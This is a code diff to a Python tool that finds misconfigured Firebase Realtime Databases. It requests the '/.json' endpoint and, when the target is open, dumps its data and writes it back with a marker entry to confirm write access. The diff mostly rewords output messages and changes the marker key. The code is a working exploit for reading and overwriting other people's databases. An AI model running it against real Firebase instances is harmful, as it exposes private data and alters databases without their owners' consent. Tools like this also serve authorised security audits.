@@ -15,7 +15,7 @@ class Core():
             if r.status_code == 404 or r.status_code == 500:
                 print(f"[!] URL {self.target} not avaliable")
             else:
-                print("[*] it's ok, trying to exploiting..")
+                print(f"[*] Status code from {self.target} is {r.status_code}.. verify firebase permissions")
                 self.json_flaw()
         except (requests.exceptions.BaseHTTPError,requests.exceptions.Timeout) as e:
             print(e)
@@ -25,15 +25,14 @@ class Core():
         exploit = self.target + "/.json"
         try:
             r = requests.get(exploit, headers=headers, timeout=30)
-            print(f"[!] status code from {exploit} is [{r.status_code}]")
             if r.status_code == 401 or "Permission denied" in r.text or "Firebase error. Please ensure that you spelled the name of your Firebase correctly" in r.text or "has been disabled by a database owner" in r.text:
-                print(f"[!] Target: {exploit} not vulnerable i got {r.status_code} status code.")
+                print(f"[!] Target: {exploit} not vulnerable status code is :{r.status_code}")
             elif r.status_code == 402 and "has exceeded its quota limit and has been temporarily disabled" in r.text:
                 print(f'[!] Target is OPEN but exceeded its quota limit')
             else:
                 # ugly condition.. 
                 if r.status_code == 200:
-                    print(f"[*] Target is vulnerable copy the URL {exploit} and verify possible leaks of sensitive information")
+                    print(f"[*] Target is vulnerable copy the URL {exploit} paste at browser and verify possible leaks of sensitive information")
                     answer = input("[*] would you like to dump all data and submit again to test write permissions ?(y/N) ")
 
                     if answer[0].lower() == "y":
@@ -45,9 +44,9 @@ class Core():
                     try:
                         print(f"[INFO] Trying to exploit {exploit}")
                         resp = requests.put(exploit, json=data, timeout=30)
-                        if "nullfil3" in resp.text:
+                        if "NZ2WY3DGNFWDGCQ=" in resp.text:
                             print("[*] Target is exploitable!")
-                            print(f"[*] Verify is the string (this firebase has weak permissions please review then) at the response here [{exploit}]")
+                            print(f"[*] Verify if the string ==> this firebase has weak permissions please review then <== at the response here [{exploit}]")
                     except (requests.exceptions.HTTPError,requests.Timeout) as e:
                         print(f"[!] i cant upload the file :/ i got {e}")
         except (requests.exceptions.BaseHTTPError,requests.exceptions.Timeout) as e:
@@ -60,7 +59,7 @@ class Core():
         fh.close()
 
         data_text = json.loads(json_data_text)
-        data_json = {"nullfil3":"this firebase has weak permissions please review them"}
+        data_json = {"NZ2WY3DGNFWDGCQ=":"this firebase has weak permissions please review them"}
         data_text.update(data_json)
         return data_text
 
@@ -68,6 +67,8 @@ class Core():
         if google_api_key == "" or google_api_key == None:
                 print("=> impossible to retrive remote config, api key not found..")
                 return
+        elif google_app_id == "" or google_app_id == None:
+            print("==> impossible to execute the remote config, google app id not found")
         else:
             strip_id = google_app_id.split(":")[1]
             url_remote_config = f"https://firebaseremoteconfig.googleapis.com/v1/projects/{strip_id}/namespaces/firebase:fetch?key={google_api_key}"
